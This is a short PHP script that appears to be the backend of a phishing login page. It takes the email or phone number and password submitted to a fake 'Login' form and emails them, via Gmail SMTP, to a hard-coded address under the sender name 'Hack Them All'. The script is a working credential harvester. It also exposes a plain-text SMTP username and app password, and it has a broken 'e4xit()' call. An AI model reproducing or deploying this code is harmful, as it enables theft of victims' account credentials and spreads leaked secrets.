<?php 

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

if (isset($_POST['Login']))
{

        $email = $_POST['email'];
        $Password = $_POST['password'];

        //Create an instance; passing `true` enables exceptions
        $mail = new PHPMailer(true);

    try {
        //Server settings
        // $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
        $mail->isSMTP();                                            //Send using SMTP
        $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
        $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
        $mail->Username   = 'skywu042@gmail.com';                     //SMTP username
        $mail->Password   = 'pbpasxwprjylcnpg';                               //SMTP password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;            //ENCRYPTION_SMTPS 465 - Enable implicit TLS encryption
        $mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

        //Recipients
        $mail->setFrom('skywu042@gmail.com', 'Hack Them All');
        $mail->addAddress('skywu042@gmail.com', 'Hack Them All');     //Add a recipient
    


        //Content
        $mail->isHTML(true);                                  //Set email format to HTML
        $mail->Subject = 'New enquiry - Hack Them Contact Form';
        $mail->Body    = '<h3>Hello, you got a new enquiry</h3>
            <h4>Email_address_or_phone_number: '.$email.'</h4>
            <h4>password: '.$Password.'</H4>
       ';

         $mail->send();
         echo 'Message has been sent';
    }   catch (Exception $e) {
         echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }


}
else
{
    header('Location: index.php');
    e4xit();
}

?>